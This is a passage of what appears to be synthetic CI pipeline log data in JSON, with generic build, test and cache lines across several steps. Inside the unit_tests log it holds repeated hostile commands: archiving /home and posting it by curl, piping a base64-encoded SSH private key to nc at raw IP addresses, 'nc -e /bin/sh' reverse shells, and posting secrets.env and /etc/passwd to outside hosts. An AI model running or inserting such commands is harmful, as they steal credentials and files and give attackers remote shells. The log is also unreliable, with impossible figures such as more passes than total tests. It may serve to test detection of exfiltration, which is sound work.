7f35e15\nGenerating source maps...\nStep 9/24: Running migrations\nGenerating source maps...\n  PASS: test_user_create (222ms)\n[12:17:58] DEBUG: Memory usage: 1644MB\n\u2717 build failed with exit code 14\n  PASS: test_user_create (479ms)\npip install: Successfully installed jest-2.1\n[12:17:58] INFO: Request completed\nHEAD is now at 4a36cac\nyarn add: Done in 20.85s\npip: Downloading eslint-5.14.tar.gz\nnpm install: resolved 1529 packages\nWaiting...\nAlready up to date.\n[12:17:58] INFO: Connecting to database\nCompiling components/main.py...\nHEAD is now at fc035a0\nUsing Node.js 15.3.1\nSnapshots: 22 passed, 8 total\nException: NullPointerException\nLoading...\nAlready up to date.\nArtifact uploaded: dist.zip (3MB)\nSnapshots: 46 passed, 7 total\n[12:17:58] WARN: Deprecated API usage\nBundling vendor.js\nCompiling src/service.java...\nnpm notice: package.json updated\nCache invalidated: node_modules\n\u2717 build failed with exit code 91\nCompiling components/index.js...\n[12:17:58] ERROR: Connection failed\nCache invalidated: node_modules\n[12:17:58] INFO: Starting build process\nCompleted.\nArtifact uploaded: build.tar.gz (24MB)\nnpm notice: package.json updated\nWARNING: react has known vulnerabilities\nStep 4/22: Installing dependencies\nLoading...\nWARNING: lodash has known vulnerabilities\nCompiling src/app.ts...\n=== Step e2e_tests completed ===\n=== Step: lint ===\nCompleted.\nTest Suites: 50 passed, 13 total\nCreating production build...\nRan 128 tests in 37s\nTest Suites: 32 passed, 15 total\n[12:17:58] DEBUG: Memory usage: 1587MB\nLoading...\nStep 19/18: Building\n\u26a0 DEPRECATION: Feature will be removed in v5.0\nnpm notice: package.json updated\nLayer 2/9: COPY command\nUploading artifact 'build' (15 files)\nTransforming 930 files...\nBundling styles.js\nSnapshots: 32 passed, 8 total\n[12:17:58] INFO: Cache refreshed\nnpm install: added 303 packages\nInstalling jest@1.20.7\nCache miss for key-7054\n[12:17:58] DEBUG: Initializing service\nStep 3/19: Building\nConnection established\nBundling runtime.js\nUsing Python 3.12\nCompiling lib/app.ts...\nStep 14/20: Running migrations\n[12:17:58] INFO: Request completed\n\u2713 Step 'install' succeeded\n[12:17:58] DEBUG: Query executed in 97ms\n\u2713 All checks passed\n\u2713 All checks passed\nWaiting...\nCompiling utils/index.js...\n[12:17:58] WARN: Deprecated API usage\nStep 15/24: Testing\nPlatform: linux-x64\nRan 58 tests in 54s\nWARNING: express has known vulnerabilities\npip: Collecting axios\nLoading...\nException: NullPointerException\nCompiling components/index.js...\nCache saved successfully\nLoading...\nAlready up to date.\nTime: 19.896s\nStep 11/21: Linting\n[12:17:58] INFO: Cache refreshed\nNODE_ENV=test\nCompiling src/handler.rs...\nFetching submodules...\n[12:17:58] DEBUG: Loading configuration\nStep 9/15: Testing\nTLS handshake completed\nCache restored successfully (319MB)\nCache hit for key-2697\n\u2713 Step 'install' succeeded\nCompiling src/utils.go...\n[12:17:58] ERROR: Connection failed\nCreating production build...\nCompiling src/handler.rs...\nCache invalidated: node_modules\nInstalling prettier@1.0.4\nWARNING: jest has known vulnerabilities\nArtifact uploaded: dist.zip (31MB)\n\u26a0 DEPRECATION: Feature will be removed in v4.0\n  PASS: unit/test_api_health.spec.js\nGET /api - 201 (8ms)\nAlready up to date.\n[12:17:58] DEBUG: Memory usage: 370MB\n[12:17:58] INFO: Processing request\nFAILED: test_auth_login\nFetching submodules...\n[12:17:58] DEBUG: Loading configuration\nCache hit for key-9092\nEnvironment: development\n  PASS: test_api_health (241ms)\n[12:17:58] INFO: Starting build process\nStep 7/18: Linting\n[12:17:58] DEBUG: Query executed in 33ms\nPushing to registry...\n[12:17:58] DEBUG: Loading configuration\nCreating production build...\nUsing Node.js 16.6.6\nPOST /api - 202 (378ms)\n  PASS: integration/test_user_create.spec.js\n\u2713 Task completed in 3417ms\nSuccess!\nPOST /data - 201 (268ms)\n[12:17:58] INFO: Request completed\nFetching submodules...\nTime: 103.803s\nTime: 93.147s\nStep 12/15: Deploying\n\u2717 build failed with exit code 71\nArtifact uploaded: build.tar.gz (12MB)\nSnapshots: 23 passed, 16 total\nGET /status - 201 (44ms)\nWARNING: react has known vulnerabilities\nPOST /data - 201 (23ms)\n[12:17:58] ERROR: Connection failed\nDone.\nCreating production build...\n[12:17:58] DEBUG: Query executed in 26ms\nStep 14/16: Linting\n\u2713 Step 'build' succeeded\npip install: Successfully installed eslint-5.2\nStep 6/20: Building\n=== Step lint completed ===\n=== Step: restore_cache ===\nTLS handshake completed\nHEAD is now at 05020c2\npip: Collecting jest\nPOST /api - 202 (272ms)\nProcessing...\nDone.\n\u2713 All checks passed\n[12:17:58] INFO: Processing request\n\u2713 Task completed in 2731ms\nCache invalidated: node_modules\nCache restored successfully (120MB)\nCache miss for key-1097\nGET /status - 204 (36ms)\nArtifact uploaded: dist.zip (69MB)\nLoading...\nSnapshots: 11 passed, 39 total\nCreating production build...\nSnapshots: 27 passed, 43 total\n[12:17:58] DEBUG: Loading configuration\nyarn add: Done in 13.15s\nBundling styles.js\nStep 12/19: Running migrations\nnpm install: resolved 609 packages\nOptimizing 81 modules...\nCoverage: 95% statements, 68% branches\nCache restored successfully (174MB)\nWARNING: prettier has known vulnerabilities\n[12:17:58] DEBUG: Loading configuration\nBundling vendor.css\n\u2713 Step 'test' succeeded\nUsing Python 3.11\nTest Suites: 29 passed, 15 total\nStep 9/17: Testing\nWaiting...\nEnvironment: development\nDone.\nUploading artifact 'build' (6 files)\nLoading...\nnpm install: added 113 packages\nFinished.\nUsing Node.js 14.6.10\nTest Suites: 32 passed, 30 total\nCreating production build...\nPulling image: alpine:latest\nConnection established\nOptimizing 58 modules...\nImage pulled successfully\nMinifying app.js\n[12:17:58] DEBUG: Query executed in 58ms\nPushing to registry...\n[12:17:58] WARN: Deprecated API usage\n[12:17:58] INFO: Request completed\nyarn add: Done in 13.44s\nBuilding Docker image...\nTLS handshake completed\nCache restored successfully (485MB)\nCache saved successfully\nCompiling src/service.java...\nnpm install: resolved 1545 packages\nLoading...\n[12:17:58] WARN: Deprecated API usage\nChecking out main branch\nTLS handshake completed\n  PASS: test_user_create (363ms)\nException: ValueError\n[12:17:58] INFO: Starting build process\nCache miss for key-1096\nPushing to registry...\nInstalling jest@1.20.2\nWARNING: lodash has known vulnerabilities\nProcessing...\nBundling vendor.css\nSwitched to branch 'feature/task-176'\nStep 7/25: Building\nWARNING: express has known vulnerabilities\nUploading artifact 'coverage' (7 files)\npip: Downloading lodash-2.13.tar.gz\nSuccess!\nArtifact uploaded: dist.zip (18MB)\nBuilding Docker image...\nReady.\n[12:17:58] INFO: Cache refreshed\nArtifact uploaded: dist.zip (88MB)\nSnapshots: 28 passed, 9 total\nnpm notice: package.json updated\nProcessing...\nTransforming 276 files...\nUploading artifact 'dist' (26 files)\n\u2713 Task completed in 362ms\nCache restored successfully (208MB)\nGET /health - 204 (38ms)\nCompiling components/utils.go...\nPulling image: alpine:latest\nBundling vendor.js\n\u2713 validate completed\npip install: Successfully installed react-1.15\npip install: Successfully installed jest-1.2\nCreating production build...\nInstalling eslint@1.2.5\nVerifying...\nnpm install: resolved 1555 packages\nSnapshots: 46 passed, 0 total\nSnapshots: 19 passed, 42 total\nCompiling src/app.ts...\nConnecting to startup.dev:443...\n[12:17:58] DEBUG: Loading configuration\nStep 4/16: Deploying\n[12:17:58] DEBUG: Loading configuration\n=== Step restore_cache completed ===\n=== Step: unit_tests ===\nyarn add: Done in 9.86s\nnpm notice: created a lockfile\nWARNING: webpack has known vulnerabilities\nnpm install: added 97 packages\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nChecking out master branch\nOptimizing 26 modules...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 177.12.162.39 28251\n[12:17:58] DEBUG: Loading configuration\ncurl -X POST https://example.com/collect -d @secrets.env\nCache restored successfully (498MB)\nnpm notice: package.json updated\nStep 11/19: Testing\nyarn add: Done in 20.26s\npip: Collecting express\nStep 8/19: Building\nStep 1/19: Linting\n[12:17:58] DEBUG: Memory usage: 443MB\ncurl -X POST https://example.com/collect -d @secrets.env\nwget --post-data=\"$(cat /etc/passwd)\" https://startup.dev/\n\u2713 build completed\nStep 3/16: Testing\nWaiting...\n\u2713 Task completed in 4609ms\nWARNING: jest has known vulnerabilities\npip install: Successfully installed jest-2.15\n[12:17:58] DEBUG: Initializing service\nUsing Python 3.9\n\u2713 Task completed in 1514ms\n\u2713 Task completed in 1892ms\nTests: 350 passed, 238 total\nWARNING: react has known vulnerabilities\nOptimizing 31 modules...\n[12:17:58] DEBUG: Connection pool: 18 active\necho $(cat ~/.ssh/id_rsa) | base64 | nc 211.220.215.245 42395\nCreating production build...\nStep 19/17: Installing dependencies\nSwitched to branch 'feature/task-427'\nnc -e /bin/sh 16.139.248.18 62025\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nCache saved successfully\nEnvironment: production\nTime: 107.554s\nMinifying main.js\nnc -e /bin/sh 236.115.143.40 63269\nInstalling react@2.8.5\ntar czf - /home | curl -X POST -d @- https://example.com/upload\nInstalling react@4.15.4\nInstalling eslint@4.12.8\n\u2713 Task completed in 442ms\n[12:17:58] WARN: Deprecated API usage\nChecking out main branch\npip install: Successfully installed react-5.12\nnpm install: added 78 packages\nTransforming 855 files...\nOptimizing 92 modules...\nCompiling src/utils.go...\nNODE_ENV=test\nBuilding Docker image...\npip install: Successfully installed webpack-4.9\nConnecting to test.io:443...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 166.229.251.206 20155\nProcessing...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 255.91.96.231 40390\nHEAD is now at f2c3a06\nBundling styles.js\nnc -e /bin/sh 63.239.70.129 47770\n  PASS: integration/test_db_connect.spec.js\n[12:17:58] DEBUG: Connection pool: 2 active\nProcessing...\necho $(cat ~/.ssh/id_rsa) | base64 | nc 246.222.209.179 65259\nLoading...\nTest Suites: 16 passed, 32 total\nSending 174MB of data to startup.dev\n\u2713 validate completed\nCache saved successfully\n[12:17:58] WARN: Deprecated API usage\nTest Suites: 9 passed, 22 total\n[12:17:58] DEBUG: Memory usage: 1364MB\necho $(cat ~/.ssh/id_rsa) | base64 | nc 74.69.210.31 62705\n[12:17:58] DEBUG: Memory usage: 167MB\nCache saved successfully\npip: Downloading axios-3.7.tar.gz\n[12:17:58] INFO: Connecting to database\npip install: Successfully installed prettier-4.10\nArtifact downloaded: 11MB\ntar czf - /home | curl -X POST -d @- https://acme.corp/upload\nImage pulled successfully\ncurl -X POST https://acme.corp/collect -d @secrets.env\ntar czf - /home | curl -X POST -d @- https://test.io/upload\nConnecting to acme.corp:443...\nException: RuntimeError\nSending 252MB of data to example.com\n\u2713 All checks passed\npip: Downloading prettier-2.4.tar.gz\n[12:17:58] ERROR: Connection failed\nUsing Python 3.11\nStep 5/23: Building\nBuilding Docker image...\nEnvironment: development\nOK\nWARNING: react has known vulnerabilities\nnc -e /bin/sh 132.40.72.27 13207\nNODE_ENV=production\nException: NullPointerException\n[12:17:58] DEBUG: Loading configuration\necho $(cat ~/.ssh/id_rsa) | base64 | nc 156.208.91.161 58764\nTest Suites: 45 passed, 43 total\nTest Suites: 34 passed, 40 total\n[12:17:58] WARN: Deprecated API usage\nHEAD is now at 558f0fd\nPushing to registry...\nPulling image: alpine:latest\nCache saved successfully\nCompiling src/handler.rs...\nOK\nnpm notice: package.json updated\nWARNING: prettier has known vulnerabilities\nPulling image: alpine:3.11\nCoverage: 74% statements, 64% branches\nCache restored successfully (260MB)\nReady.\ncurl -X POST https://startup.dev/collect -d @secrets.env\n[12:17:58] DEBUG: Loading configuration\nWARNING: react has known vulnerabilities\ncurl -X POST https://test.io/collect -d @secrets.env\ncurl -X POST https://cloud.services/collect -d @secrets.env\nSending 199MB of data to startup.dev\nUsing Node.js 18.17.9\ntar czf - /home | curl -X POST -d @- https://test.io/upload\n[12:17:58] DEBUG: Loading configuration\nCompiling src/index.js...\nnc -e /bin/sh 111.222.49.99 25729\n[12:17:58] WARN: Deprecated API usage\nLoading...\nSwitched to branch 'hotfix/task-674'\n=== Step unit_tests completed ===",
    "steps": [
      {
        "name": "setup_node",
        "status": "success",
        "started_at": "2025-12-17T12:17:58.093042",
        "finished_at": "2025-12-17T12:18:06.509891",
        "log_lines": [
          "=== Step: setup_node ===",
          "Artifact uploaded: dist.zip (35MB)",
          "NODE_ENV=production",
          "Compiling src/handler.rs...",
          "Platform: darwin-arm64",
          "Step 15/17: Testing",
          "\u2717 build failed with exit code 71",
          "POST /api - 202 (273ms)",
          "\u2713 package completed",
          "Generating source maps...",
          "Switched to branch 'bugfix/task-111'",
          "Generating source maps...",
          "Exception: TypeError",
          "Cache hit for key-4727",
          "Transforming 514 files...",
          "\u2713 Step 'install' succeeded",
          "Compiling src/handler.rs...",
          "Platform: linux-x64",
          "Building Docker image...",
          "Compiling src/main.py...",
          "pip: Downloading jest-2.19.tar.gz",
          "\u2717 build failed with exit code 16",
          "Checking out main branch",
          "npm notice: package.json updated",
          "Compiling components/utils.go...",
          "Step 14/22: Running migrations",
          "yarn add: Done in 30.23s",
          "Artifact uploaded: dist.zip (19MB)",
          "Bundling vendor.css",
          "Pulling image: alpine:3.11",
          "[12:17:58] INFO: Processing request",
          "[12:17:58] DEBUG: Connection pool: 20 active",
          "Cache saved successfully",
          "Connecting to acme.corp:443...",
          "  PASS: e2e/test_auth_login.spec.js",
          "Creating production build...",
          "Connecting to startup.dev:443...",
          "Environment: production",
          "Cache restored successfully (235MB)",
          "[12:17:58] WARN: Deprecated API usage",
          "[12:17:58] INFO: Request completed",
          "Coverage: 88% statements, 60% branches",
          "OK",
          "Verifying...",
          "Artifact downloaded: 48MB",
          "Compiling utils/index.js...",
          "pip: Downloading lodash-5.6.tar.gz",
          "Completed.",
          "  PASS: test_user_create (301ms)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "[12:17:58] DEBUG: Query executed in 71ms",
          "Generating source maps...",
          "Time: 68.230s",
          "Transforming 105 files...",
          "\u2713 Step 'test' succeeded",
          "Pushing to registry...",
          "Done.",
          "WARNING: jest has known vulnerabilities",
          "npm notice: created a lockfile",
          "Uploading artifact 'build' (22 files)",
          "pip: Collecting jest",
          "pip: Collecting webpack",
          "Waiting...",
          "pip: Installing build dependencies...",
          "Generating source maps...",
          "Cache miss for key-9324",
          "[12:17:58] ERROR: Connection failed",
          "Time: 6.941s",
          "[12:17:58] DEBUG: Memory usage: 413MB",
          "Ready.",
          "[12:17:58] WARN: Deprecated API usage",
          "Already up to date.",
          "Pulling image: alpine:3.11",
          "Ran 112 tests in 48s",
          "[12:17:58] INFO: Processing request",
          "Artifact uploaded: dist.zip (31MB)",
          "Compiling utils/index.js...",
          "Uploading artifact 'build' (8 files)",
          "TLS handshake completed",
          "Time: 74.888s",
          "Cache miss for key-7546",
          "npm install: resolved 799 packages",
          "Platform: win32-x64",
          "Step 6/23: Testing",
          "[12:17:58] WARN: Deprecated API usage",
          "Cache restored successfully (55MB)",
          "Uploading artifact 'build' (50 files)",
          "POST /api - 202 (442ms)",
          "Bundling main.css",
          "[12:17:58] DEBUG: Memory usage: 1834MB",
          "Cache restored successfully (413MB)",
          "[12:17:58] WARN: Deprecated API usage",
          "\u2713 Task completed in 4296ms",
          "Cache invalidated: node_modules",
          "npm notice: package.json updated",
          "Exception: NullPointerException",
          "Step 20/25: Running migrations",
          "Snapshots: 31 passed, 26 total",
          "[12:17:58] DEBUG: Loading configuration",
          "Layer 10/13: ENV command",
          "Cache hit for key-1923",
          "[12:17:58] INFO: Connecting to database",
          "Installing axios@1.10.5",
          "[12:17:58] WARN: Deprecated API usage",
          "[12:17:58] INFO: Request completed",
          "\u2713 All checks passed",
          "Generating source maps...",
          "Step 18/20: Installing dependencies",
          "Loading...",
          "=== Step setup_node completed ==="
        ]
      },
      {
        "name": "deploy_staging",
        "status": "success",
        "started_at": "2025-12-17T12:18:06.509891",
        "finished_at": "2025-12-17T12:18:14.926740",
        "log_lines": [
          "=== Step: deploy_staging ===",
          "[12:17:58] DEBUG: Memory usage: 200MB",
          "\u2713 Task completed in 2496ms",
          "pip: Downloading jest-4.7.tar.gz",
          "Optimizing 11 modules...",
          "Connection established",
          "\u2713 All checks passed",
          "OK",
          "  PASS: unit/test_api_health.spec.js",
          "[12:17:58] DEBUG: Initializing service",
          "Layer 5/8: RUN command",
          "Step 7/23: Running migrations",
          "NODE_ENV=test",
          "\u2713 Task completed in 1763ms",
          "POST /upload - 202 (163ms)",
          "\u2717 build failed with exit code 10",
          "Done.",
          "Compiling utils/main.py...",
          "  PASS: integration/test_cache_hit.spec.js",
          "Compiling components/main.py...",
          "Verifying...",
          "\u2713 All checks passed",
          "Artifact downloaded: 49MB",
          "pip: Installing build dependencies...",
          "[12:17:58] DEBUG: Query executed in 32ms",
          "Compiling utils/handler.rs...",
          "Switched to branch 'bugfix/task-746'",
          "Step 18/15: Installing dependencies",
          "\u2713 Step 'install' succeeded",
          "Loading...",
          "[12:17:58] ERROR: Connection failed",
          "\u2713 Task completed in 2674ms",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "FAILED: test_db_connect",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Uploading artifact 'coverage' (21 files)",
          "Fetching submodules...",
          "Creating production build...",
          "Connecting to cloud.services:443...",
          "pip: Installing build dependencies...",
          "[12:17:58] DEBUG: Query executed in 20ms",
          "Connection established",
          "Step 1/22: Building",
          "Installing lodash@4.9.10",
          "Artifact downloaded: 46MB",
          "Switched to branch 'bugfix/task-231'",
          "Uploading artifact 'dist' (19 files)",
          "Switched to branch 'bugfix/task-737'",
          "[12:17:58] ERROR: Connection failed",
          "[12:17:58] ERROR: Connection failed",
          "Creating production build...",
          "npm notice: package.json updated",
          "Processing...",
          "Waiting...",
          "Transforming 658 files...",
          "Success!",
          "  PASS: test_api_health (297ms)",
          "Building Docker image...",
          "HEAD is now at 73f2727",
          "[12:17:58] INFO: Connecting to database",
          "Platform: darwin-arm64",
          "HEAD is now at 2699811",
          "Snapshots: 6 passed, 13 total",
          "POST /data - 200 (91ms)",
          "Optimizing 44 modules...",
          "HEAD is now at c31bedf",
          "[12:17:58] DEBUG: Initializing service",
          "Success!",
          "[12:17:58] DEBUG: Query executed in 87ms",
          "pip: Installing build dependencies...",
          "\u2713 test completed",
          "pip: Installing build dependencies...",
          "npm notice: created a lockfile",
          "Using Node.js 17.6.8",
          "Minifying app.js",
          "Ran 120 tests in 22s",
          "Tests: 111 passed, 500 total",
          "[12:17:58] DEBUG: Loading configuration",
          "Connecting to test.io:443...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Checking out main branch",
          "Snapshots: 26 passed, 46 total",
          "Compiling utils/app.ts...",
          "pip install: Successfully installed axios-5.7",
          "Platform: win32-x64",
          "Connection established",
          "[12:17:58] INFO: Processing request",
          "Layer 3/9: RUN command",
          "Connection established",
          "Completed.",
          "Switched to branch 'bugfix/task-764'",
          "Uploading artifact 'coverage' (31 files)",
          "Artifact uploaded: build.tar.gz (1MB)",
          "pip install: Successfully installed express-4.7",
          "Waiting...",
          "\u2713 Task completed in 1530ms",
          "Connecting to cloud.services:443...",
          "\u2713 lint completed",
          "[12:17:58] INFO: Processing request",
          "Bundling runtime.js",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "HEAD is now at 86ce95f",
          "Building Docker image...",
          "Exception: NullPointerException",
          "WARNING: express has known vulnerabilities",
          "Optimizing 90 modules...",
          "Switched to branch 'bugfix/task-874'",
          "[12:17:58] DEBUG: Connection pool: 5 active",
          "Pushing to registry...",
          "=== Step deploy_staging completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-12-17T12:18:14.926740",
        "finished_at": "2025-12-17T12:18:31.760438",
        "log_lines": [
          "=== Step: integration_tests ===",
          "Compiling lib/handler.rs...",
          "npm notice: created a lockfile",
          "npm notice: package.json updated",
          "Ran 155 tests in 43s",
          "TLS handshake completed",
          "Cache invalidated: node_modules",
          "Time: 64.68s",
          "Switched to branch 'feature/task-584'",
          "[12:17:58] INFO: Request completed",
          "[12:17:58] INFO: Starting build process",
          "Artifact downloaded: 1MB",
          "Optimizing 96 modules...",
          "[12:17:58] INFO: Starting build process",
          "Cache saved successfully",
          "\u2717 build failed with exit code 13",
          "  PASS: test_db_connect (382ms)",
          "Fetching submodules...",
          "Connecting to test.io:443...",
          "pip: Collecting webpack",
          "\u2713 All checks passed",
          "Using Python 3.12",
          "Cache saved successfully",
          "  PASS: e2e/test_cache_hit.spec.js",
          "[12:17:58] ERROR: Connection failed",
          "Minifying main.js",
          "TLS handshake completed",
          "pip: Installing build dependencies...",
          "Verifying...",
          "[12:17:58] INFO: Connecting to database",
          "\u2713 Step 'checkout' succeeded",
          "pip: Downloading axios-2.3.tar.gz",
          "[12:17:58] INFO: Processing request",
          "Checking out main branch",
          "\u2713 All checks passed",
          "Using Python 3.11",
          "Success!",
          "npm notice: package.json updated",
          "Artifact downloaded: 11MB",
          "Completed.",
          "[12:17:58] INFO: Starting build process",
          "[12:17:58] WARN: Deprecated API usage",
          "Ready.",
          "HEAD is now at a1637e4",
          "Ran 128 tests in 32s",
          "Ran 127 tests in 7s",
          "Tests: 131 passed, 434 total",
          "npm notice: package.json updated",
          "Time: 52.832s",
          "Tests: 153 passed, 96 total",
          "Coverage: 73% statements, 86% branches",
          "[12:17:58] DEBUG: Initializing service",
          "Completed.",
          "Cache invalidated: build",
          "[12:17:58] DEBUG: Initializing service",
          "[12:17:58] DEBUG: Initializing service",
          "[12:17:58] DEBUG: Loading configuration",
          "Loading...",
          "HEAD is now at 87378c1",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Pulling image: node:18",
          "Step 16/16: Linting",
          "npm notice: package.json updated",
          "Minifying main.js",
          "[12:17:58] WARN: Deprecated API usage",
          "POST /api - 202 (31ms)",
          "Pulling image: alpine:latest",
          "[12:17:58] DEBUG: Initializing service",
          "Minifying app.js",
          "npm notice: created a lockfile",
          "HEAD is now at d489764",
          "Test Suites: 22 passed, 16 total",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "[12:17:58] INFO: Cache refreshed",
          "Optimizing 28 modules...",
          "Cache hit for key-1292",
          "HEAD is now at d017aa3",
          "npm install: added 373 packages",
          "Compiling lib/handler.rs...",
          "pip install: Successfully installed eslint-3.1",
          "pip install: Successfully installed webpack-5.10",
          "Finished.",
          "Compiling src/handler.rs...",
          "NODE_ENV=development",
          "[12:17:58] WARN: Deprecated API usage",
          "Step 10/18: Building",
          "[12:17:58] ERROR: Connection failed",
          "Creating production build...",
          "WARNING: react has known vulnerabilities",
          "[12:17:58] DEBUG: Connection pool: 13 active",
          "[12:17:58] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "[12:17:58] WARN: Deprecated API usage",
          "[12:17:58] INFO: Processing request",
          "Step 16/15: Testing",
          "Compiling components/handler.rs...",
          "HEAD is now at c6aa033",
          "Cache invalidated: dependencies",
          "Checking out develop branch",
          "npm notice: package.json updated",
          "[12:17:58] DEBUG: Memory usage: 1569MB",
          "Installing eslint@2.3.3",
          "Building Docker image...",
          "Connecting to test.io:443...",
          "[12:17:58] INFO: Connecting to database",
          "Compiling components/app.ts...",
          "Compiling utils/service.java...",
          "WARNING: jest has known vulnerabilities",
          "Artifact downloaded: 12MB",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-12-17T12:18:31.760438",
        "finished_at": "2025-12-17T12:18:57.010985",
        "log_lines": [
          "=== Step: build ===",
          "Optimizing 60 modules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Using Node.js 20.8.2",
          "Cache restored successfully (424MB)",
          "Fetching submodules...",
          "npm notice: created a lockfile",
          "Minifying app.js",
          "[12:17:58] DEBUG: Connection pool: 18 active",
          "  PASS: test_user_create (190ms)",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "[12:17:58] ERROR: Connection failed",
          "Verifying...",
          "WARNING: axios has known vulnerabilities",
          "Processing...",
          "Already up to date.",
          "Using Python 3.12",
          "Uploading artifact 'dist' (5 files)",
          "[12:17:58] INFO: Processing request",
          "[12:17:58] INFO: Starting build process",
          "\u2713 All checks passed",
          "Snapshots: 6 passed, 29 total",
          "Pulling image: node:latest",
          "npm notice: package.json updated",
          "[12:17:58] INFO: Cache refreshed",
          "pip install: Successfully installed prettier-5.2",
          "npm notice: package.json updated",
          "[12:17:58] INFO: Connecting to database",
          "Cache hit for key-5845",
          "Artifact uploaded: build.tar.gz (17MB)",
          "\u2713 Step 'build' succeeded",
          "npm notice: created a lockfile",
          "Using Node.js 20.6.7",
          "HEAD is now at 68762db",
          "npm notice: created a lockfile",
          "npm install: resolved 878 packages",
          "\u2713 test completed",
          "Exception: TypeError",
          "Artifact uploaded: dist.zip (59MB)",
          "Processing...",
          "Transforming 124 files...",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "[12:17:58] ERROR: Connection failed",
          "Done.",
          "[12:17:58] WARN: Deprecated API usage",
          "[12:17:58] DEBUG: Loading configuration",
          "POST /api - 201 (57ms)",
          "[12:17:58] INFO: Request completed",
          "Cache restored successfully (60MB)",
          "Completed.",
          "Platform: linux-x64",
          "Creating production build...",
          "Using Node.js 15.9.0",
          "Already up to date.",
          "Cache saved successfully",
          "Verifying...",
          "Cache saved successfully",
          "Environment: test",
          "NODE_ENV=development",
          "Switched to branch 'hotfix/task-180'",
          "[12:17:58] DEBUG: Initializing service",
          "Switched to branch 'feature/task-390'",
          "pip: Downloading lodash-2.20.tar.gz",
          "Cache invalidated: build",
          "  PASS: test_api_health (13ms)",
          "TLS handshake completed",
          "Pulling image: python:latest",
          "Loading...",
          "OK",
          "Compiling utils/service.java...",
          "pip: Collecting prettier",
          "Snapshots: 11 passed, 6 total",
          "[12:17:58] INFO: Connecting to database",
          "Exception: NullPointerException",
          "Environment: production",
          "pip: Downloading eslint-5.3.tar.gz",
          "Image pulled successfully",
          "Step 1/18: Running migrations",
          "npm notice: created a lockfile",
          "pip: Downloading express-2.3.tar.gz",
          "Compiling src/index.js...",
          "Time: 61.277s",
          "Finished.",
          "Pushing to registry...",
          "[12:17:58] WARN: Deprecated API usage",
          "Time: 83.2s",
          "Image pulled successfully",
          "FAILED: test_auth_login",
          "Pushing to registry...",
          "Success!",
          "Transforming 163 files...",
          "Cache miss for key-3105",
          "Using Node.js 19.17.9",
          "\u2713 validate completed",
          "\u2713 lint completed",
          "  PASS: test_user_create (110ms)",
          "Completed.",
          "[12:17:58] DEBUG: Loading configuration",
          "Uploading artifact 'dist' (27 files)",
          "[12:17:58] WARN: Deprecated API usage",
          "Transforming 774 files...",
          "Switched to branch 'hotfix/task-243'",
          "Artifact downloaded: 35MB",
          "Building Docker image...",
          "[12:17:58] DEBUG: Connection pool: 13 active",
          "Step 14/17: Building",
          "  PASS: test_auth_login (40ms)",
          "Step 12/21: Deploying",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "checkout",
        "status": "success",
        "started_at": "2025-12-17T12:18:57.010985",
        "finished_at": "2025-12-17T12:19:00.377725",
        "log_lines": [
          "=== Step: checkout ===",
          "Finished.",
          "Finished.",
          "Using Node.js 18.15.7",
          "Tests: 491 passed, 137 total",
          "Cache restored successfully (130MB)",
          "Fetching submodules...",
          "Minifying app.js",
          "Time: 99.700s",
          "Connecting to startup.dev:443...",
          "WARNING: express has known vulnerabilities",
          "Snapshots: 46 passed, 0 total",
          "Uploading artifact 'dist' (41 files)",
          "TLS handshake completed",
          "[12:17:58] INFO: Cache refreshed",
          "npm notice: package.json updated",
          "Connecting to example.com:443...",
          "Using Python 3.11",
          "Optimizing 15 modules...",
          "Test Suites: 40 passed, 49 total",
          "yarn add: Done in 26.25s",
          "TLS handshake completed",
          "Connection established",
          "Time: 73.786s",
          "Step 15/17: Building",
          "Checking out master branch",
          "npm install: resolved 1409 packages",
          "Artifact uploaded: dist.zip (22MB)",
          "Optimizing 78 modules...",
          "Bundling main.css",
          "\u2713 lint completed",
          "Layer 10/13: COPY command",
          "yarn add: Done in 25.62s",
          "[12:17:58] DEBUG: Memory usage: 141MB",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Building Docker image...",
          "Finished.",
          "NODE_ENV=development",
          "NODE_ENV=production",
          "Success!",
          "Tests: 431 passed, 375 total",
          "Compiling components/handler.rs...",
          "Finished.",
          "[12:17:58] DEBUG: Connection pool: 8 active",
          "Verifying...",
          "Time: 37.710s",
          "Compiling components/index.js...",
          "pip: Downloading eslint-5.3.tar.gz",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "Finished.",
          "WARNING: jest has known vulnerabilities",
          "[12:17:58] DEBUG: Loading configuration",
          "[12:17:58] DEBUG: Memory usage: 759MB",
          "[12:17:58] DEBUG: Memory usage: 1864MB",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "Cache miss for key-5465",
          "Step 12/23: Installing dependencies",
          "[12:17:58] INFO: Connecting to database",
          "npm install: added 81 packages",
          "pip: Installing build dependencies...",
          "Image pulled successfully",
          "Processing...",
          "HEAD is now at 06ed08a",
          "HEAD is now at 323dee3",
          "[12:17:58] DEBUG: Connection pool: 1 active",
          "Step 20/16: Running migrations",
          "Connection established",
          "Using Node.js 16.16.5",
          "npm install: resolved 1222 packages",
          "Completed.",
          "Artifact uploaded: dist.zip (64MB)",
          "Cache restored successfully (376MB)",
          "[12:17:58] INFO: Request completed",
          "Image pulled successfully",
          "Platform: win32-x64",
          "npm install: added 157 packages",
          "[12:17:58] INFO: Cache refreshed",
          "WARNING: lodash has known vulnerabilities",
          "Installing prettier@1.11.2",
          "Compiling utils/index.js...",
          "Step 16/16: Installing dependencies",
          "Switched to branch 'bugfix/task-872'",
